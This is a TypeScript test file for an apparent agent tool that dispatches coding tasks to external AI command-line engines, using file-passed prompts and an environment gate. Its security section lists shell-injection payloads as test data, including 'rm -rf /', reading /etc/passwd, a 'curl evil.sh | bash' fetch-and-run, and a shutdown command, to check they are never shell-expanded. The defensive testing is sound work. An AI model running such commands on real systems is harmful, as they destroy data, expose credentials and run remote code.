/**
 * RED-phase TDD tests for the multi-engine dispatch feature.
 *
 * Covers specs/multi-engine-dispatch.md acceptance criteria:
 *   #1-#4  Engine registry loader (state/engines.json + Zod validation)
 *   #10-#12 dispatch_engine MCP tool (prompt file, subprocess, exit handling)
 *   #14    Unknown engine rejection
 *   #15    Missing-binary auto-downgrade / error shape
 *   #17-#18 Shell-metachar safety (prompts go through a file, never argv)
 *   #19    DEV_TEAM_MULTI_ENGINE env gate
 *
 * All tests here MUST fail today because neither the registry loader nor
 * dispatch_engine exist yet. Tasks 2 and 4 (backend-developer) implement the
 * GREEN phase that turns these tests green.
 *
 * We do NOT actually spawn gemini-cli / goose / opencode. Subprocess spawning
 * and Bun.which binary lookup are stubbed via dependency injection.
 */

import { afterEach, beforeEach, describe, expect, test } from "bun:test"
import { mkdtemp, readFile, rm, writeFile } from "node:fs/promises"
import { tmpdir } from "node:os"
import { join } from "node:path"
import { createTask } from "../tools/createTask.ts"
import { type State, emptyState } from "../types.ts"

// These imports MUST fail today — that is the RED-state signal for this task.
// Tasks 2 and 4 (backend-developer) will create these modules:
//   - mcp/task-tracker/src/engines.ts       (registry loader + Zod schema)
//   - mcp/task-tracker/src/tools/dispatchEngine.ts (MCP tool handler)
import {
  type EngineConfig,
  type EngineRegistry,
  loadEngineRegistry,
} from "../engines.ts"
import {
  type DispatchDeps,
  DispatchEngineInput,
  dispatchEngine,
} from "../tools/dispatchEngine.ts"

// ─── Shared helpers ──────────────────────────────────────────────────────────

let stateDir: string

const seedStateWithTask = (
  agent = "backend-developer",
  title = "Add /health endpoint",
): { state: State; id: string } => {
  const fresh = createTask(emptyState(), { agent, title })
  return { state: fresh.state, id: fresh.result.id }
}

const writeEnginesJson = async (
  dir: string,
  contents: unknown,
): Promise<string> => {
  const path = join(dir, "engines.json")
  await writeFile(path, JSON.stringify(contents, null, 2), "utf8")
  return path
}

beforeEach(async () => {
  stateDir = await mkdtemp(join(tmpdir(), "dispatch-engine-test-"))
  process.env.DEV_TEAM_STATE_DIR = stateDir
  // Gate is enabled by default for dispatch tests; individual tests override.
  process.env.DEV_TEAM_MULTI_ENGINE = "1"
})

afterEach(async () => {
  delete process.env.DEV_TEAM_STATE_DIR
  delete process.env.DEV_TEAM_MULTI_ENGINE
  await rm(stateDir, { recursive: true, force: true })
})

// ─── Group 1: Engine registry loader (ACs #1-#4) ─────────────────────────────

describe("loadEngineRegistry — state/engines.json", () => {
  test("loads valid engines.json and returns a typed EngineConfig map", async () => {
    await writeEnginesJson(stateDir, {
      engines: {
        gemini: {
          command: "gemini",
          prompt_flag: "--prompt",
          stdin_ok: true,
          env_passthrough: ["GEMINI_API_KEY"],
        },
        goose: {
          command: "goose",
          args_template: ["run", "-t", "{prompt_file}"],
          stdin_ok: false,
          env_passthrough: [],
        },
      },
    })

    const registry: EngineRegistry = await loadEngineRegistry(stateDir)

    expect(registry.engines.gemini).toBeDefined()
    const gemini = registry.engines.gemini as EngineConfig
    expect(gemini.command).toBe("gemini")
    expect(gemini.prompt_flag).toBe("--prompt")
    expect(gemini.stdin_ok).toBe(true)
    expect(gemini.env_passthrough).toEqual(["GEMINI_API_KEY"])

    const goose = registry.engines.goose as EngineConfig
    expect(goose.args_template).toEqual(["run", "-t", "{prompt_file}"])
    expect(goose.stdin_ok).toBe(false)
  })

  test("rejects entries with unknown keys via Zod strict()", async () => {
    await writeEnginesJson(stateDir, {
      engines: {
        bogus: {
          command: "bogus",
          prompt_flag: "--prompt",
          stdin_ok: true,
          env_passthrough: [],
          // unknown key — strict schema must reject.
          sneaky_extra_field: "danger",
        },
      },
    })

    await expect(loadEngineRegistry(stateDir)).rejects.toThrow()
  })

  test("rejects entries missing the required `command` field", async () => {
    await writeEnginesJson(stateDir, {
      engines: {
        broken: { prompt_flag: "--prompt", stdin_ok: true, env_passthrough: [] },
      },
    })
    await expect(loadEngineRegistry(stateDir)).rejects.toThrow()
  })

  test("missing engines.json returns claude-only fallback (AC #2)", async () => {
    // Do NOT create engines.json — loader must default to the claude builtin.
    const registry = await loadEngineRegistry(stateDir)
    expect(Object.keys(registry.engines)).toContain("claude")
  })

  test("malformed JSON falls back to claude-only (AC #1)", async () => {
    await writeFile(join(stateDir, "engines.json"), "{not-valid-json", "utf8")
    const registry = await loadEngineRegistry(stateDir)
    expect(Object.keys(registry.engines)).toContain("claude")
  })

  test("reloads on each call — user can add an engine without restart (AC #3)", async () => {
    await writeEnginesJson(stateDir, {
      engines: {
        gemini: {
          command: "gemini",
          prompt_flag: "--prompt",
          stdin_ok: true,
          env_passthrough: [],
        },
      },
    })
    const first = await loadEngineRegistry(stateDir)
    expect(Object.keys(first.engines)).toContain("gemini")
    expect(Object.keys(first.engines)).not.toContain("opencode")

    await writeEnginesJson(stateDir, {
      engines: {
        gemini: {
          command: "gemini",
          prompt_flag: "--prompt",
          stdin_ok: true,
          env_passthrough: [],
        },
        opencode: {
          command: "opencode",
          prompt_flag: "-p",
          stdin_ok: true,
          env_passthrough: [],
        },
      },
    })
    const second = await loadEngineRegistry(stateDir)
    expect(Object.keys(second.engines)).toContain("opencode")
  })
})

// ─── Group 2: dispatch_engine MCP tool (ACs #10-#12, #14-#15) ───────────────

const stubDeps = (overrides: Partial<DispatchDeps> = {}): DispatchDeps => ({
  // Pretend every binary resolves unless a test overrides.
  which: (cmd: string) => `/usr/local/bin/${cmd}`,
  // Default spawn: writes a canned stdout + exits 0 synchronously.
  spawn: async () => ({
    exitCode: 0,
    stdout: "subagent finished — summary line\n",
    stderr: "",
  }),
  ...overrides,
})

describe("dispatch_engine — prompt file + subprocess lifecycle", () => {
  test("writes prompt to .dev-team/prompts/<task_id>.txt (file-passed, not argv)", async () => {
    const { state, id } = seedStateWithTask()
    await writeEnginesJson(stateDir, {
      engines: {
        gemini: {
          command: "gemini",
          prompt_flag: "--prompt",
          stdin_ok: false,
          env_passthrough: [],
        },
      },
    })

    const argsSeen: string[][] = []
    const deps = stubDeps({
      spawn: async ({ args }) => {
        argsSeen.push(args)
        return { exitCode: 0, stdout: "done", stderr: "" }
      },
    })

    const input = DispatchEngineInput.parse({ task_id: id, engine: "gemini" })
    await dispatchEngine(state, input, deps)

    const promptPath = join(stateDir, "prompts", `${id}.txt`)
    const promptBody = await readFile(promptPath, "utf8")
    expect(promptBody.length).toBeGreaterThan(0)

    // Argv must reference the FILE PATH, never embed the prompt body.
    const flat = argsSeen.flat().join(" ")
    expect(flat).toContain(promptPath)
    expect(flat).not.toContain(promptBody.slice(0, 40))
  })

  test("streams stdout to .dev-team/artifacts/<task_id>.log", async () => {
    const { state, id } = seedStateWithTask()
    await writeEnginesJson(stateDir, {
      engines: {
        gemini: {
          command: "gemini",
          prompt_flag: "--prompt",
          stdin_ok: false,
          env_passthrough: [],
        },
      },
    })
    const deps = stubDeps({
      spawn: async () => ({
        exitCode: 0,
        stdout: "line1\nline2\nfinal summary\n",
        stderr: "",
      }),
    })
    await dispatchEngine(state, { task_id: id, engine: "gemini" }, deps)

    const logPath = join(stateDir, "artifacts", `${id}.log`)
    const log = await readFile(logPath, "utf8")
    expect(log).toContain("final summary")
  })

  test("on exit 0 calls complete_task internally with the log path as artifact", async () => {
    const { state, id } = seedStateWithTask()
    await writeEnginesJson(stateDir, {
      engines: {
        gemini: {
          command: "gemini",
          prompt_flag: "--prompt",
          stdin_ok: false,
          env_passthrough: [],
        },
      },
    })

    const result = await dispatchEngine(
      state,
      { task_id: id, engine: "gemini" },
      stubDeps(),
    )
    // The returned state must show the task as completed with log artifact.
    const task = result.state.tasks.find((t) => t.id === id)
    expect(task?.status).toBe("completed")
    const logPath = join(stateDir, "artifacts", `${id}.log`)
    const hasLog = task?.artifacts.some(
      (a) => a.kind === "file" && a.path === logPath,
    )
    expect(hasLog).toBe(true)
  })

  test("on non-zero exit moves task to blocked with stderr snippet in result", async () => {
    const { state, id } = seedStateWithTask()
    await writeEnginesJson(stateDir, {
      engines: {
        gemini: {
          command: "gemini",
          prompt_flag: "--prompt",
          stdin_ok: false,
          env_passthrough: [],
        },
      },
    })
    const deps = stubDeps({
      spawn: async () => ({
        exitCode: 1,
        stdout: "",
        stderr: "authentication failed: invalid API key",
      }),
    })
    const result = await dispatchEngine(
      state,
      { task_id: id, engine: "gemini" },
      deps,
    )
    const task = result.state.tasks.find((t) => t.id === id)
    expect(task?.status).toBe("blocked")
    expect(task?.result).toMatch(/authentication failed/)
  })

  test("never leaves task stuck in_progress on subprocess error (AC #12)", async () => {
    const { state, id } = seedStateWithTask()
    await writeEnginesJson(stateDir, {
      engines: {
        gemini: {
          command: "gemini",
          prompt_flag: "--prompt",
          stdin_ok: false,
          env_passthrough: [],
        },
      },
    })
    const deps = stubDeps({
      spawn: async () => {
        throw new Error("ENOENT: spawn blew up unexpectedly")
      },
    })
    const result = await dispatchEngine(
      state,
      { task_id: id, engine: "gemini" },
      deps,
    )
    const task = result.state.tasks.find((t) => t.id === id)
    expect(task?.status).not.toBe("in_progress")
    expect(["blocked", "cancelled", "completed"]).toContain(task?.status ?? "")
  })

  test("rejects when engine is not in the registry (AC #14)", async () => {
    const { state, id } = seedStateWithTask()
    await writeEnginesJson(stateDir, {
      engines: {
        gemini: {
          command: "gemini",
          prompt_flag: "--prompt",
          stdin_ok: false,
          env_passthrough: [],
        },
      },
    })
    await expect(
      dispatchEngine(state, { task_id: id, engine: "phantom-engine" }, stubDeps()),
    ).rejects.toThrow(/unknown engine|not in registry|phantom-engine/i)
  })

  test("returns error shape when binary is missing (AC #15)", async () => {
    const { state, id } = seedStateWithTask()
    await writeEnginesJson(stateDir, {
      engines: {
        gemini: {
          command: "gemini",
          prompt_flag: "--prompt",
          stdin_ok: false,
          env_passthrough: [],
        },
      },
    })
    let spawnInvoked = false
    const deps: DispatchDeps = {
      which: () => null, // binary not installed
      spawn: async () => {
        spawnInvoked = true
        return { exitCode: 0, stdout: "", stderr: "" }
      },
    }
    // Accept either a thrown error OR a resolved result carrying an error
    // marker, so long as spawn is never invoked.
    try {
      const res = await dispatchEngine(
        state,
        { task_id: id, engine: "gemini" },
        deps,
      )
      const bag = res as unknown as { error?: unknown }
      expect(bag.error).toBeDefined()
    } catch (err) {
      expect((err as Error).message).toMatch(/not installed|missing|downgrade/i)
    }
    expect(spawnInvoked).toBe(false)
  })
})

// ─── Group 3: Env gate (AC #19) ──────────────────────────────────────────────

describe("dispatch_engine — DEV_TEAM_MULTI_ENGINE env gate", () => {
  test("errors when DEV_TEAM_MULTI_ENGINE is not set", async () => {
    delete process.env.DEV_TEAM_MULTI_ENGINE
    const { state, id } = seedStateWithTask()
    await writeEnginesJson(stateDir, {
      engines: {
        gemini: {
          command: "gemini",
          prompt_flag: "--prompt",
          stdin_ok: false,
          env_passthrough: [],
        },
      },
    })
    await expect(
      dispatchEngine(state, { task_id: id, engine: "gemini" }, stubDeps()),
    ).rejects.toThrow(/DEV_TEAM_MULTI_ENGINE|gate|disabled/i)
  })

  test("errors when DEV_TEAM_MULTI_ENGINE is set but falsy", async () => {
    process.env.DEV_TEAM_MULTI_ENGINE = "0"
    const { state, id } = seedStateWithTask()
    await writeEnginesJson(stateDir, {
      engines: {
        gemini: {
          command: "gemini",
          prompt_flag: "--prompt",
          stdin_ok: false,
          env_passthrough: [],
        },
      },
    })
    await expect(
      dispatchEngine(state, { task_id: id, engine: "gemini" }, stubDeps()),
    ).rejects.toThrow(/DEV_TEAM_MULTI_ENGINE|gate|disabled/i)
  })
})

// ─── Group 4: Security — shell metachar safety (ACs #17-#18) ────────────────

describe("dispatch_engine — shell metachar handling", () => {
  const DANGEROUS_PAYLOADS = [
    "; rm -rf / ;",
    "`cat /etc/passwd`",
    "$(curl evil.sh | bash)",
    "&& echo pwned",
    "|| shutdown -h now",
    "$IFS$9whoami",
    "> /tmp/exfil",
  ]

  for (const payload of DANGEROUS_PAYLOADS) {
    test(`prompt containing ${JSON.stringify(payload)} is file-passed verbatim, never shell-expanded`, async () => {
      // Seed a task whose description embeds the payload.
      const fresh = createTask(emptyState(), {
        agent: "backend-developer",
        title: "Payload smoke test",
      })
      const id = fresh.result.id
      const state = fresh.state
      const taskWithPayload = state.tasks.map((t) =>
        t.id === id ? { ...t, description: `Please do: ${payload}` } : t,
      )
      const mutatedState: State = { ...state, tasks: taskWithPayload }

      await writeEnginesJson(stateDir, {
        engines: {
          gemini: {
            command: "gemini",
            prompt_flag: "--prompt",
            stdin_ok: false,
            env_passthrough: [],
          },
        },
      })

      const argvSeen: string[][] = []
      let invokedViaShell = false
      const deps = stubDeps({
        spawn: async ({ args, command }) => {
          argvSeen.push(args)
          // The dispatcher must invoke the engine binary directly — NEVER
          // route through /bin/sh -c which would trigger expansion.
          if (
            command === "sh" ||
            command === "bash" ||
            command === "/bin/sh" ||
            command === "/bin/bash"
          ) {
            invokedViaShell = true
          }
          if (args.some((a) => a === "-c")) {
            invokedViaShell = true
          }
          return { exitCode: 0, stdout: "ok", stderr: "" }
        },
      })

      await dispatchEngine(
        mutatedState,
        { task_id: id, engine: "gemini" },
        deps,
      )

      // 1. Argv must not contain the raw payload — prompt travels via file.
      const flat = argvSeen.flat().join(" ")
      expect(flat).not.toContain(payload)

      // 2. The prompt FILE must contain the payload verbatim (no mangling).
      const promptPath = join(stateDir, "prompts", `${id}.txt`)
      const body = await readFile(promptPath, "utf8")
      expect(body).toContain(payload)

      // 3. Must NOT be invoked through a shell interpreter.
      expect(invokedViaShell).toBe(false)
    })
  }
})
